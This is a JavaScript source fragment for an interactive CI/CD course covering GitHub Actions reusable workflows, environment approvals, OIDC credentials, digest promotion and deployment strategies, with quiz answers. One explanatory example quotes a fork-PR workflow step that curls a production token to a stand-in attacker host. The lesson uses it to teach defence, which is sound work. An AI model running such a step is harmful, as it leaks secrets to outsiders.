      inputLabel: 'concepts separated by commas (trigger, job, runner, needs, matrix, cache, artifact, secret, environment, approval, concurrency, reuse)',
      gen: function (input) {
        var names = String(input || '').toLowerCase().split(',').map(function (s) { return s.trim(); }).filter(Boolean);
        if (!names.length) throw new Error('Type some concepts, e.g. cache, approval, matrix');
        if (names.length > 12) throw new Error('At most 12 concepts');
        names.forEach(function (n) { if (!MAP.hasOwnProperty(n)) throw new Error('Unknown concept "' + n + '". Try: ' + Object.keys(MAP).join(', ')); });
        var rows = [], hl = {}, frames = [];
        frames.push({ narr: 'We will translate each idea from <b>GitHub Actions</b> into <b>GitLab CI</b> and <b>Jenkins</b>. The idea stays; only the keyword changes.', parts: [{ type: 'table', label: 'translation table', columns: ['idea', 'GitHub Actions', 'GitLab CI', 'Jenkins'], rows: [['(none yet)', '', '', '']] }] });
        names.forEach(function (n, i) {
          var r = MAP[n];
          rows.push([n, r[0], r[1], r[2]]);
          hl = {}; hl[i] = 'ok';
          frames.push({ narr: '<b>' + H.esc(n) + '</b>: in GitHub Actions it is <code>' + r[0] + '</code>; GitLab CI calls it <code>' + r[1] + '</code>; Jenkins uses <code>' + r[2] + '</code>.', parts: [{ type: 'table', label: 'translation table', columns: ['idea', 'GitHub Actions', 'GitLab CI', 'Jenkins'], rows: rows.slice(), hl: hl }] });
        });
        frames.push({ narr: 'Notice what does <b>not</b> change: you still need small jobs, an order, caching, saved outputs, protected secrets and a human gate before production. Learn those, and switching tools takes days, not months.', parts: [{ type: 'table', label: 'translation table', columns: ['idea', 'GitHub Actions', 'GitLab CI', 'Jenkins'], rows: rows.slice() }] });
        return pad4(frames, 'Done.');
      }
    }],
    examples: [
      { title: 'Situation: change the standard in one place', html: `<p>A platform team owns <code>acme/.github/.github/workflows/build.yml</code>. Forty services call it as <code>uses: acme/.github/.github/workflows/build.yml@&lt;full-sha&gt;</code>. When the team adds an SBOM step, they cut a new tag, and a bot (Dependabot for <code>github-actions</code>) opens forty PRs bumping the pin. Each service reviews and merges on its own schedule, so a mistake never lands in forty repos at once.</p>` },
      { title: 'Jenkins "gotchas" you can say out loud in an interview', html: `<p>(1) Pipelines live in a <code>Jenkinsfile</code> in the repo (pipeline as code), not clicked together in the UI. (2) The controller schedules, <b>agents</b> run the work; never run builds on the controller. (3) Credentials live in the Jenkins store and are bound with <code>withCredentials</code>, which masks them in logs. (4) Plugins are the biggest source of upgrade and security pain. (5) Scripted pipelines are full Groovy; declarative is the safer default.</p>` },
      { title: 'GitLab: needs, rules and resource_group together', html: `<p>A deploy job with <code>needs: [build]</code> starts the moment build finishes without waiting for the rest of its stage. <code>rules</code> restricts it to the default branch. <code>resource_group: production</code> makes two deploy jobs wait for each other. Together they give the three properties you want from any CD system: fast, scoped and serialised.</p>` },
      { title: 'Trying GitLab and Jenkins locally for free', html: `<p>Both can be run in containers for practice, no cloud account: <code>docker run -d -p 8080:8080 -v jenkins_home:/var/jenkins_home jenkins/jenkins:lts</code> then open <code>localhost:8080</code> and use the printed unlock password. For GitLab CI syntax, <code>gitlab-ci-local</code> (an npm tool) runs jobs on your machine. Delete the volume afterwards: <code>docker volume rm jenkins_home</code>.</p>` }
    ],
    deepDive: `<p>🟣 <b>Versioning reusable workflows.</b> Pinning to a branch (<code>@main</code>) means a change in the platform repo instantly affects every caller, including a broken one. Pin to a tag for convenience and to a full SHA for safety, and let a bot update the pins. Keep the reusable workflow's inputs backwards compatible (add optional inputs; never rename).</p>
      <p>🟣 <b>Where the permissions go.</b> A reusable workflow runs with the permissions the caller grants. If the caller says <code>contents: read</code>, a callee asking for <code>packages: write</code> fails. Set permissions in both places so intent is visible.</p>
      <p>🟣 <b>Custom actions beyond composite.</b> JavaScript actions (<code>node20</code>) and Docker container actions give full code, at the price of maintenance and a larger supply-chain surface. Prefer a composite action that calls a script in your repo: easy to read and test with the same tools as the rest of your code.</p>
      <p>🟣 <b>Choosing a CI system.</b> Keep CI close to where the code lives (GitHub Actions for GitHub, GitLab CI for GitLab). Jenkins makes sense when you must run on-premise with custom hardware or have a large existing investment. Whatever you choose, keep the real logic in scripts (<code>make test</code>, <code>./ci/build.sh</code>) so the YAML is thin and moving between tools is mostly renaming.</p>`,
    aiEra: `<p>🤖 Migration between CI systems is one of the best uses of an assistant: paste the Jenkinsfile, ask for the Actions equivalent, then ask it to list <i>what does not translate</i> (plugins, lockable resources, agents with special labels). The list of gaps is the valuable output, so do not accept a clean-looking YAML that silently dropped the approval step.</p>
      <p>🤖 Be careful with AI-suggested third-party actions: models invent plausible names and recommend unmaintained ones. Check that the action exists, who owns it, its last release, and pin it to a SHA. A typo-squatted action name is a real attack.</p>`,
    problems: [P({
      t: 'Turn a copy-pasted build into a reusable workflow', l: 'Medium', tags: ['reusable workflow', 'workflow_call', 'secrets', 'outputs'], co: ['Shopify', 'Wipro', 'Atlassian'],
      s: `<p>Three services each contain the same 12-line build job. Create one reusable workflow <code>build.yml</code> that takes a <code>node-version</code> input (default 22) and an optional <code>NPM_TOKEN</code> secret, builds, uploads the <code>dist/</code> folder and outputs the artifact name. Then write a caller workflow for <code>main</code> that uses it and prints the artifact name in a second job. Pass only the secret that is needed.</p>`,
      ex: `<p>Caller runs → job <code>build</code> shows as <code>build / build</code> in the UI → job <code>report</code> prints ${H.c('g', 'built artifact site-3f9c2e1...')}. Changing the build in one file changes it for every caller.</p>`,
      bw: `<p>Copy the job into each repo and fix bugs three times, or use <code>secrets: inherit</code> so the callee can read every secret the caller has, including ones it never needs.</p>`,
      q: ['A reusable workflow wants to read a secret. How does it get one?', ['The caller passes it under <code>secrets:</code> (or <code>secrets: inherit</code>)', 'It reads the caller\'s secrets automatically', 'Secrets cannot be used in reusable workflows', 'Through <code>inputs:</code> with type secret'], 0, 'Secrets are not shared implicitly across workflow_call. The caller maps them explicitly (best) or uses inherit (convenient, broader).'],
      h: ['<p>Hint 1: the callee has <code>on: workflow_call</code> with <code>inputs</code>, <code>secrets</code> and <code>outputs</code>.</p>', '<p>Hint 2: a workflow-level output points at a job output: <code>value: @{{ jobs.build.outputs.artifact }}</code>.</p>', '<p>Hint 3: the caller job uses <code>uses:</code> instead of <code>runs-on</code>, and reads <code>needs.build.outputs.artifact</code>.</p>'],
      a: `<p>The reusable workflow is a function: inputs, secrets, outputs, plus the jobs. The output travels step output → job output → workflow output → caller's <code>needs</code>. The caller maps just the one secret it needs.</p>`,
      code: Y(REUSABLE + '\n---\n' + CALLER, 'build.yml and release.yml (two files, shown together)'),
      cx: `<p>One definition, N callers. Cost is the discipline of versioning the shared file.</p>`,
      f: ['How would you roll out a breaking change to the reusable workflow safely?', 'When is a composite action the better choice here?']
    })]
  });

  // ───────────────────────── Topic 5: environments, secrets, OIDC, promotion ─────────────────────────
  var TRUST_JSON = `{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Principal": { "Federated": "arn:aws:iam::123456789012:oidc-provider/token.actions.githubusercontent.com" },
      "Action": "sts:AssumeRoleWithWebIdentity",
      "Condition": {
        "StringEquals": {
          "token.actions.githubusercontent.com:aud": "sts.amazonaws.com",
          "token.actions.githubusercontent.com:sub": "repo:YOUR-ORG/YOUR-REPO:environment:production"
        }
      }
    }
  ]
}`;
  var PROMOTE = R`# .github/workflows/release.yml
# Build ONCE, then promote the same image digest: staging, then (after a human approves) production.
name: release
on:
  push:
    branches: [main]
permissions:
  contents: read                                   # default for every job; jobs ask for more only if needed
concurrency:
  group: release
  cancel-in-progress: false                        # deploys queue, they are never killed halfway

jobs:
  build:
    runs-on: ubuntu-latest
    permissions:
      contents: read
      packages: write                              # to push to ghcr.io with the built-in token
    outputs:
      image: ghcr.io/@{{ github.repository }}@@{{ steps.push.outputs.digest }}
    steps:
      - uses: actions/checkout@v4
        with:
          persist-credentials: false
      - uses: docker/setup-buildx-action@v3
      - uses: docker/login-action@v3
        with:
          registry: ghcr.io
          username: @{{ github.actor }}
          password: @{{ secrets.GITHUB_TOKEN }}       # built in, short-lived, no setup needed
      - id: push
        uses: docker/build-push-action@v6
        with:
          context: .
          push: true
          tags: ghcr.io/@{{ github.repository }}:@{{ github.sha }}

  staging:
    needs: build
    runs-on: ubuntu-latest
    environment: staging                           # environment secrets/variables and history
    permissions:
      id-token: write                              # lets the job ask GitHub for an OIDC token
      contents: read
    steps:
      - uses: aws-actions/configure-aws-credentials@v4    # in real repos pin to a full commit SHA (topic 7)
        with:
          role-to-assume: @{{ vars.AWS_ROLE_ARN }}     # a non-secret variable: arn:aws:iam::123456789012:role/gha-staging
          aws-region: eu-west-1
      - name: Deploy the exact image that was built
        env:
          IMAGE: @{{ needs.build.outputs.image }}
        run: ./scripts/deploy.sh staging "$IMAGE"
      - name: Smoke test
        run: ./scripts/smoke.sh https://staging.example.com

  production:
    needs: [build, staging]
    runs-on: ubuntu-latest
    environment: production                        # required reviewers pause the job here until approved
    permissions:
      id-token: write
      contents: read
    steps:
      - uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: @{{ vars.AWS_ROLE_ARN }}     # production has its OWN value of the same variable name
          aws-region: eu-west-1
      - name: Deploy the SAME digest that passed staging
        env:
          IMAGE: @{{ needs.build.outputs.image }}
        run: ./scripts/deploy.sh production "$IMAGE"`;
  var PAGES = R`# Free deploy target for the lab: GitHub Pages (no cloud account, no cost)
name: pages
on:
  push:
    branches: [main]
permissions:
  contents: read
  pages: write
  id-token: write                      # Pages deploys use OIDC under the hood
concurrency:
  group: pages
  cancel-in-progress: false
jobs:
  deploy:
    runs-on: ubuntu-latest
    environment:
      name: github-pages
      url: @{{ steps.deployment.outputs.page_url }}
    steps:
      - uses: actions/checkout@v4
      - uses: actions/upload-pages-artifact@v3
        with:
          path: site/
      - id: deployment
        uses: actions/deploy-pages@v4`;
  var LOCAL_PROMOTE = R`#!/usr/bin/env bash
# Local lab: "promote the same artifact" without any cloud. We build once and run the SAME image id as staging and production.
set -euo pipefail

docker build -t demo-app:build .                               # the one and only build
DIGEST="$(docker image inspect demo-app:build --format '{{.Id}}')"
echo "built $DIGEST"

# Tag points at the exact image; config differs per environment via env vars, never via rebuilding.
docker run -d --name app-staging    -p 8081:8080 -e APP_ENV=staging    "$DIGEST"
docker run -d --name app-production -p 8082:8080 -e APP_ENV=production "$DIGEST"

curl -fsS localhost:8081/health && echo " staging ok"
curl -fsS localhost:8082/health && echo " production ok"

docker inspect app-staging app-production --format '{{.Name}} image={{.Image}}'   # identical image ids
docker rm -f app-staging app-production                        # clean up`;

  topics.push({
    title: 'Environments, Approvals, Secrets, OIDC and Build Once, Deploy Many',
    analogy: `<p>Shipping a product is like <b>sending a sealed parcel through checkpoints</b>. You pack the parcel once. Each checkpoint (staging, production) checks the same parcel and stamps it; nobody opens it and re-packs it, because then you could not be sure what you tested is what arrives. The guard at the last checkpoint wants a signature from a named person (<b>required reviewer</b>). And instead of giving every courier a copy of the warehouse master key (<b>long-lived cloud keys</b>), the warehouse hands each courier a <b>day pass</b> that works only for that delivery (<b>OIDC</b>).</p>`,
    explain: `<p>🟢 <b>Environments.</b> A GitHub <b>environment</b> (<code>staging</code>, <code>production</code>) is a named place you deploy to. Setting <code>environment: production</code> on a job gives it three superpowers: <b>protection rules</b> (required reviewers, wait timer, only certain branches or tags may deploy), <b>environment-scoped secrets and variables</b> (production values are visible only to production jobs), and a <b>deployment history</b> in the UI. A job waiting for approval holds no runner and costs nothing.</p>
      <p>🟢 <b>Secrets without leaks.</b> Store credentials in <b>Settings → Secrets and variables</b> and read them as <code>@{{ secrets.NAME }}</code>. Never write a token in YAML, in a script, in a Dockerfile or in a commit. Secrets are masked in logs, but masking is only text matching: a script that prints it base64-encoded or splits it still leaks it. Use non-secret <b>variables</b> (<code>@{{ vars.NAME }}</code>) for non-sensitive settings such as a role ARN or a region.</p>
      <p>🔵 <b>Better than stored keys: OIDC.</b> Long-lived AWS access keys in secrets are the classic leak. With <b>OpenID Connect</b>, the job asks GitHub for a signed identity token ("I am repo X, environment production, branch main"). The cloud trusts GitHub as an identity provider, checks those claims, and returns <b>short-lived credentials</b> (about an hour). Nothing durable to steal or rotate. You need: <code>permissions: id-token: write</code> on the job, a role in AWS whose trust policy names your repo and environment, and <code>aws-actions/configure-aws-credentials</code> with <code>role-to-assume</code>. Azure and GCP work the same way.</p>
      <p>🔵 <b>Build once, deploy many.</b> The artifact you promote must be the one you tested. Build the image <b>one time</b> (on main), identify it by its <b>digest</b> (<code>sha256:...</code>, immutable) and have staging and production deploy that digest. Differences between environments (URLs, feature switches, credentials) come from runtime configuration, never from rebuilding. Rebuilding for production means production runs code nobody tested.</p>
      ${H.table(['Promote this', 'Not this'], [
        ['<code>ghcr.io/org/app@sha256:9f2c...</code> (immutable)', '<code>ghcr.io/org/app:latest</code> (a moving label)'],
        ['one build, N deploys, N config files', 'N builds with N hard-coded settings'],
        ['short-lived OIDC credentials per job', 'one set of long-lived keys shared by every job']
      ])}
      <p>🔵 <b>Free deploy targets for practice.</b> GitHub Pages (static sites) and a local Docker container need no cloud account. Optional cloud labs (AWS) cost a few cents on the free tier: always note the cost, set a budget alert, and tear down at the end.</p>`,
    clues: [
      '"Production deploys need manager sign-off" → <code>environment: production</code> with required reviewers (and "prevent self-review")',
      '"We store AWS keys in GitHub secrets" → replace with OIDC: <code>id-token: write</code> plus <code>role-to-assume</code>; scope the trust policy by repo and environment',
      '"Staging passed but production broke; the code was the same" → it was not: rebuilt per environment, or <code>latest</code> moved. Promote one digest',
      '"A secret appeared in a log" → rotate it first, then fix the cause (printing, <code>set -x</code>, echoing env); masking is not protection',
      '"Only main may deploy to production" → deployment branch rules on the environment, plus OIDC <code>sub</code> condition',
      '"Different database URL for staging and prod" → environment variables/secrets, injected at deploy time'
    ],
    code: [Y(PROMOTE, 'release.yml: build once, promote the digest'), Y(PAGES, 'pages.yml: free GitHub Pages deploy'), { lang: 'json', title: 'AWS role trust policy (placeholders only)', code: TRUST_JSON }, SH(LOCAL_PROMOTE, 'Local promote-the-same-artifact lab')],
    codeTitle: ['A full promotion pipeline with approvals and OIDC', 'Zero-cost deploy target', 'The IAM trust policy that makes OIDC safe', 'Prove two environments run one image'],
    viz: [{
      title: 'Promotion pipeline: one digest, gates between environments',
      input: 'digest: sha256:9f2c | staging: pass | approval: approved | production: pass',
      inputLabel: 'digest, then staging (pass/fail), approval (approved/rejected), production (pass/fail)',
      gen: function (input) {
        var s = String(input || '');
        function get(k, ok) { var m = s.match(new RegExp(k + '\\s*:\\s*([^|]+)', 'i')); var v = m ? m[1].trim().toLowerCase() : ok[0]; if (ok.indexOf(v) < 0 && k !== 'digest') throw new Error(k + ' must be one of: ' + ok.join(', ')); return v; }
        var dm = s.match(/digest\s*:\s*([^|\s]+)/i), digest = dm ? dm[1] : 'sha256:9f2c';
        var st = get('staging', ['pass', 'fail']), ap = get('approval', ['approved', 'rejected']), pr = get('production', ['pass', 'fail']);
        var nodes = [box('build', 'build', 8, 24, 14), box('reg', 'registry', 28, 24, 15), box('stg', 'staging', 49, 24, 14), box('gate', 'approval', 70, 24, 15), box('prod', 'production', 90, 24, 16)];
        var edges = [['build', 'reg'], ['reg', 'stg'], ['stg', 'gate'], ['gate', 'prod']];
        var frames = [], hl = {}, tags = {};
        function fr(narr, ehl) { return { narr: narr, parts: [{ type: 'graph', label: 'pipeline (the image id never changes)', height: 50, nodes: nodes, edges: edges, hl: JSON.parse(JSON.stringify(hl)), tags: JSON.parse(JSON.stringify(tags)), ehl: ehl || {} }] }; }
        frames.push(fr('A push to main starts the pipeline. The goal: <b>build one image</b>, then move that exact image through the environments.'));
        hl.build = 'ok'; hl.reg = 'ok'; tags.reg = H.esc(digest);
        frames.push(fr('The image is built once and pushed. Its <b>digest</b> <code>' + H.esc(digest) + '</code> is a fingerprint of the contents: it cannot change without becoming a different digest. Every later stage receives this digest as input.', { 'build-reg': 'ok' }));
        hl.stg = st === 'pass' ? 'ok' : 'bad'; tags.stg = H.esc(digest);
        frames.push(fr('Staging deploys <code>' + H.esc(digest) + '</code> using short-lived OIDC credentials and runs smoke tests: <b class="' + (st === 'pass' ? 'c-g">pass' : 'c-r">fail') + '</b>.' + (st === 'fail' ? ' The pipeline stops. Production never sees this build.' : ''), { 'reg-stg': st === 'pass' ? 'ok' : 'bad' }));
        if (st === 'fail') { frames.push(fr('Because the later jobs <code>needs</code> staging, they are skipped. Fix forward with a new commit, which produces a new digest.')); return pad4(frames, 'Done.'); }
        hl.gate = ap === 'approved' ? 'ok' : 'bad';
        frames.push(fr('The production job targets <code>environment: production</code>, so GitHub pauses it. A required reviewer (not the author) looks at the staging result and ' + (ap === 'approved' ? '<b class="c-g">approves</b>.' : '<b class="c-r">rejects</b>.'), { 'stg-gate': ap === 'approved' ? 'ok' : 'bad' }));
        if (ap === 'rejected') { frames.push(fr('Rejected: the job is cancelled and nothing reaches production. No runner was held while waiting.')); return pad4(frames, 'Done.'); }
        hl.prod = pr === 'pass' ? 'ok' : 'bad'; tags.prod = H.esc(digest);
        frames.push(fr('Production receives the <b>same</b> digest <code>' + H.esc(digest) + '</code>, with production-only config from environment secrets. Result: <b class="' + (pr === 'pass' ? 'c-g">success' : 'c-r">failure') + '</b>.' + (pr === 'fail' ? ' Because the previous digest is still in the registry, rollback is one redeploy (topic 6).' : ' What was tested is exactly what runs.'), { 'gate-prod': pr === 'pass' ? 'ok' : 'bad' }));
        return pad4(frames, 'Done.');
      }
    }],
    examples: [
      { title: 'Situation: a leaked token from a fork PR (and why environments help)', html: `<p>A contributor forks the repo and opens a PR that edits the workflow to <code>run: curl evil.example -d "$PROD_TOKEN"</code>. With <code>pull_request</code>, fork PRs run with <b>no secrets</b> and a read-only token, so nothing leaks. The leak happens when someone switches the trigger to <code>pull_request_target</code> and checks out the PR code (topic 7), or stores a prod key as a repository-wide secret that any job can read. Environment secrets restrict the key to jobs that pass the production gate; OIDC removes the stored key entirely.</p>` },
      { title: 'Reading a trust policy line by line', html: `<p>In the JSON above: <code>Principal.Federated</code> says "trust tokens issued by GitHub's OIDC provider in <i>my</i> account". <code>aud = sts.amazonaws.com</code> says the token was meant for AWS. <code>sub = repo:YOUR-ORG/YOUR-REPO:environment:production</code> says only jobs of this repo that run in the <code>production</code> environment can assume the role. A job on a feature branch, or from a fork, has a different <code>sub</code> and is refused. The <code>sub</code> condition is the whole security: a wildcard like <code>repo:YOUR-ORG/*</code> lets any repo in the organisation in.</p>` },
      { title: 'Least-privilege role per environment', html: `<p>Use one role per environment with only the actions the deploy needs (for example update one ECS service and read one image repository), not <code>AdministratorAccess</code>. Staging's role should not be able to touch production resources. Deploy roles rarely need to create IAM users or delete databases, so those actions stay out.</p>` },
      { title: 'Cost note for the optional AWS lab', html: `<p>The core labs here use GitHub Pages and local containers: <b>cost 0</b>. If you try the AWS version, use the free tier, one small service, a budget alert at a few dollars, and delete the stack at the end. OIDC itself is free; IAM roles are free; only the resources you deploy cost money.</p>` }
    ],
    deepDive: `<p>🟣 <b>What is in the OIDC token.</b> Claims include <code>iss</code> (GitHub), <code>aud</code>, <code>sub</code>, <code>repository</code>, <code>ref</code>, <code>environment</code>, <code>job_workflow_ref</code> and <code>sha</code>. Cloud trust policies can match on any of them. <code>job_workflow_ref</code> pins trust to a specific reusable workflow, so only the blessed deploy workflow can assume the role, even from many repos.</p>
      <p>🟣 <b>Environment protection details.</b> Required reviewers (up to six people or teams; any one approval is enough), "prevent self-review" so the author cannot approve their own deploy, a wait timer, and deployment branch/tag policies. Protection rules on private repositories need a paid plan in some cases, so check the plan. Environment secrets are only decrypted after the gate passes.</p>
      <p>🟣 <b>Digests and tags.</b> A tag can be re-pointed; a digest cannot. Record the digest in the deployment record, deploy by digest (<code>image@sha256:...</code>), and keep tags only for humans. Image names on ghcr.io must be lowercase, so use a lowercase owner (or <code>tr '[:upper:]' '[:lower:]'</code>) when building the name from <code>github.repository</code>.</p>
      <p>🟣 <b>Config vs code.</b> Twelve-factor style: the artifact is identical, the environment supplies settings. Secrets are fetched at runtime from a secrets manager or injected by the platform; they are not baked into image layers (anyone with the image can read layers).</p>
      <p>🟣 <b>Self-hosted caveat.</b> OIDC and environments work with self-hosted runners too, but the runner's own machine identity then becomes a second route to the cloud. Keep deploy jobs on hosted or ephemeral runners.</p>`,
    aiEra: `<p>🤖 AI-generated deploy workflows often reach for <b>stored access keys</b> because that is what most older examples show: <code>AWS_ACCESS_KEY_ID</code> and <code>AWS_SECRET_ACCESS_KEY</code> in secrets. Ask explicitly for OIDC, then check three things: <code>id-token: write</code> is present only on the deploy job, <code>role-to-assume</code> uses a variable not a literal secret, and the trust policy's <code>sub</code> names a repo and an environment, not a wildcard.</p>
      <p>🤖 Never paste a real secret into an assistant to "debug" it. Paste the log with values redacted, and use the assistant to reason about the flow. If a real secret was pasted anywhere, treat it as leaked and rotate it.</p>`,
    problems: [P({
      t: 'Replace long-lived AWS keys with OIDC', l: 'Hard', tags: ['oidc', 'aws', 'secrets', 'environments', 'iam'], co: ['AWS', 'Stripe', 'Deloitte'],
      s: `<p>Your production deploy job uses repository secrets <code>AWS_ACCESS_KEY_ID</code> and <code>AWS_SECRET_ACCESS_KEY</code> of an admin user. Rewrite it to use OIDC. Provide: (1) the job, limited to the <code>production</code> environment, with the minimum token permissions; (2) the IAM role trust policy that only trusts this repository's <code>production</code> environment. Use placeholders only (account <code>123456789012</code>, repo <code>YOUR-ORG/YOUR-REPO</code>). Optional: say what you do with the old keys.</p>`,
      ex: `<p>A job on <code>environment: production</code> gets a token with <code>sub = repo:YOUR-ORG/YOUR-REPO:environment:production</code> → ${H.c('g', 'role assumed for ~1 hour')}. The same job from a feature branch, or a fork PR → ${H.c('r', 'AccessDenied')} because the <code>sub</code> differs. The old admin keys are deleted after the first successful run.</p>`,
      bw: `<p>Keep the admin keys but "make them a bit safer" by moving them to environment secrets. They still never expire, still have admin rights, and a single leak is a full account takeover until someone notices and rotates.</p>`,
      bc: Y(R`# Anti-pattern: long-lived, over-privileged, copyable keys
jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: ./scripts/deploy.sh
        env:
          AWS_ACCESS_KEY_ID: @{{ secrets.AWS_ACCESS_KEY_ID }}
          AWS_SECRET_ACCESS_KEY: @{{ secrets.AWS_SECRET_ACCESS_KEY }}`, 'long-lived keys'),
      q: ['Which line in the trust policy decides that a pull request from a fork cannot assume the role?', ['The <code>sub</code> condition naming repo and environment', 'The <code>Version</code> line', 'The <code>Action</code> line', 'The <code>aud</code> condition'], 0, 'The token\'s subject differs for forks, branches and environments. A precise sub condition accepts only the intended one. aud only checks the audience (AWS), which every GitHub token for AWS shares.'],
      h: ['<p>Hint 1: the job needs <code>permissions: id-token: write</code> (and <code>contents: read</code> for checkout).</p>', '<p>Hint 2: <code>aws-actions/configure-aws-credentials</code> takes <code>role-to-assume</code> and <code>aws-region</code>; no keys.</p>', '<p>Hint 3: the trust policy uses <code>sts:AssumeRoleWithWebIdentity</code> and a <code>StringEquals</code> on <code>sub</code> (not a wildcard).</p>'],
      a: `<p>Create the GitHub OIDC identity provider in the account once, then a role per environment with a trust policy tied to the exact subject, and a permissions policy that allows only the deploy actions. In the workflow, ask for an <code>id-token</code> and exchange it. Pin the action to a full commit SHA in the real repo. After a successful run, delete the old access keys and check the access advisor to confirm nothing else used them.</p>`,
      code: Y(R`jobs:
  deploy:
    runs-on: ubuntu-latest
    environment: production
    permissions:
      id-token: write            # request the OIDC token; nothing else is writable
      contents: read
    steps:
      - uses: actions/checkout@v4
        with:
          persist-credentials: false
      - uses: aws-actions/configure-aws-credentials@v4   # pin to a full commit SHA in a real repo
        with:
          role-to-assume: @{{ vars.AWS_ROLE_ARN }}         # arn:aws:iam::123456789012:role/gha-deploy-production
          aws-region: eu-west-1
      - run: aws sts get-caller-identity                 # proves which role you are (account id, role name)
      - run: ./scripts/deploy.sh`, 'OIDC deploy job'),
      alt: [{ lang: 'json', title: 'Role trust policy (placeholders)', code: TRUST_JSON }],
      cx: `<p>No algorithmic cost. Operationally: one-time provider and role setup, then zero secret rotation.</p>`,
      f: ['How would you let one reusable deploy workflow assume roles for many repositories safely (hint: <code>job_workflow_ref</code>)?', 'What would you monitor to detect a role being assumed from an unexpected place?']
    })]
  });

  // ───────────────────────── Topic 6: deployment strategies, rollback, flags, migrations ─────────────────────────
  var CANARY_WEIGHTS = [5, 25, 50, 100];
  // Canary rule: at each step the canary may have up to max(2 x baseline, baseline + slack) errors per 10,000 requests.
  function canaryStep(c, b, slack) { return c <= Math.max(2 * b, b + slack); }
  var BG_SCRIPT = R`#!/usr/bin/env bash
# Local blue-green lab. Needs only Docker. Two copies of the app run side by side; nginx decides which one gets traffic.
set -euo pipefail
WORK="$(mktemp -d)"
mkdir -p "$WORK/active" "$WORK/conf.d"

cat > "$WORK/conf.d/default.conf" <<'NGINX'
server {
  listen 80;
  resolver 127.0.0.11 valid=1s;           # Docker's DNS, so names blue/green resolve
  include /etc/nginx/active/active.conf;  # sets $upstream to blue or green
  location / { proxy_pass http://$upstream:5678; }
}
NGINX
echo 'set $upstream blue;' > "$WORK/active/active.conf"

docker network create bg-demo >/dev/null 2>&1 || true
docker run -d --name blue  --network bg-demo hashicorp/http-echo:1.0 -text="app v1 (blue)"  >/dev/null
docker run -d --name green --network bg-demo hashicorp/http-echo:1.0 -text="app v2 (green)" >/dev/null
docker run -d --name router --network bg-demo -p 8080:80 \
  -v "$WORK/conf.d:/etc/nginx/conf.d:ro" -v "$WORK/active:/etc/nginx/active:ro" nginx:1.27-alpine >/dev/null
sleep 2
echo "before: $(curl -fsS localhost:8080)"        # app v1 (blue)

healthy() { docker exec router wget -qO- "http://$1:5678" >/dev/null 2>&1; }

switch_to() {                                       # the whole "deploy" is one tiny, atomic change
  echo "set \$upstream $1;" > "$WORK/active/active.conf"
  docker exec router nginx -s reload
}

NEW=green; OLD=blue
if healthy "$NEW"; then                             # 1. is the idle environment healthy BEFORE we send traffic?
  switch_to "$NEW"
  sleep 1
  if curl -fsS localhost:8080 | grep -q "$NEW"; then   # 2. is it healthy AFTER the switch?
    echo "after: $(curl -fsS localhost:8080)"       # app v2 (green)
  else
    echo "post-switch check failed: rolling back"
    switch_to "$OLD"                                # 3. rollback = switch back (seconds, nothing to rebuild)
  fi
else
  echo "green is not healthy: nothing changed"
fi

docker rm -f blue green router >/dev/null; docker network rm bg-demo >/dev/null   # clean up`;
  var MIGRATE_YAML = R`# Expand / contract: the migration runs as its own job, BEFORE the app deploy, and must be backward compatible.
name: deploy-with-migration
on:
  workflow_dispatch:
    inputs:
      phase:
        description: 'Which phase of the change'
        type: choice
        options: [expand, contract]
permissions:
  contents: read
concurrency:
  group: db-migrations                   # never two migrations at once
  cancel-in-progress: false
jobs:
  migrate:
    runs-on: ubuntu-latest
    environment: production              # reviewers see the SQL before it runs
    steps:
      - uses: actions/checkout@v4
      - name: Dry run (print the SQL that would run)
        run: ./scripts/migrate.sh --phase "@{{ inputs.phase }}" --dry-run
      - name: Apply
        env:
          DATABASE_URL: @{{ secrets.DATABASE_URL }}     # placeholder secret name
        run: ./scripts/migrate.sh --phase "@{{ inputs.phase }}"
  deploy:
    needs: migrate                       # the new code starts only after the schema is ready
    runs-on: ubuntu-latest
    environment: production
    steps:
      - uses: actions/checkout@v4
      - run: ./scripts/deploy.sh`;
  var ROLLBACK_YAML = R`# Rollback = deploy a known-good, already-built digest. No rebuild, no waiting for tests.
name: rollback
on:
  workflow_dispatch:
    inputs:
      image:
        description: 'Known-good image reference, e.g. ghcr.io/YOUR-ORG/app@sha256:...'
        type: string
        required: true
permissions:
  contents: read
  id-token: write
concurrency:
  group: release                           # same queue as normal deploys, so they cannot race
  cancel-in-progress: false
jobs:
  rollback:
    runs-on: ubuntu-latest
    environment: production
    timeout-minutes: 10
    steps:
      - uses: actions/checkout@v4
      - name: Validate the input before using it
        env:
          IMAGE: @{{ inputs.image }}
        run: |
          case "$IMAGE" in
            ghcr.io/YOUR-ORG/*@sha256:*) ;;                     # only our registry, only digests
            *) echo "refusing unexpected image reference" >&2; exit 1 ;;
          esac
      - uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: @{{ vars.AWS_ROLE_ARN }}
          aws-region: eu-west-1
      - name: Deploy and verify
        env:
          IMAGE: @{{ inputs.image }}
        run: |
          ./scripts/deploy.sh production "$IMAGE"
          ./scripts/smoke.sh https://app.example.com`;

  topics.push({
    title: 'Deployment Strategies, Rollbacks, Feature Flags and Database Migrations',
    analogy: `<p>Changing a live system is like <b>changing the engine of a bus while passengers are on board</b>. A <b>rolling</b> deploy swaps one seat-row of engine parts at a time. <b>Blue-green</b> is having an identical second bus idling beside the first: you check it, then everyone steps across in one move, and stepping back is just as fast. A <b>canary</b> lets five passengers ride the new bus first while you watch if they get sick. A <b>feature flag</b> is a light switch on the dashboard: the new part is already installed, but you decide when to turn it on.</p>`,
    explain: `<p>🟢 <b>Four ways to ship a change.</b></p>
      ${H.table(['Strategy', 'How it works', 'Blast radius if bad', 'Rollback speed', 'Cost'], [
        ['<b>Recreate</b>', 'stop old, start new', 'everyone, plus downtime', 'redeploy old', 'lowest'],
        ['<b>Rolling</b>', 'replace instances a few at a time', 'grows as it rolls', 'roll back the same way (minutes)', 'low (a little extra capacity)'],
        ['<b>Blue-green</b>', 'full new environment, then switch traffic at once', 'everyone, instantly (so test first)', 'seconds (switch back)', 'high (two full environments)'],
        ['<b>Canary</b>', 'send 5%, 25%, 50%, 100% of traffic while watching metrics', 'only the canary slice', 'seconds (set weight to 0)', 'medium, plus metrics tooling']
      ])}
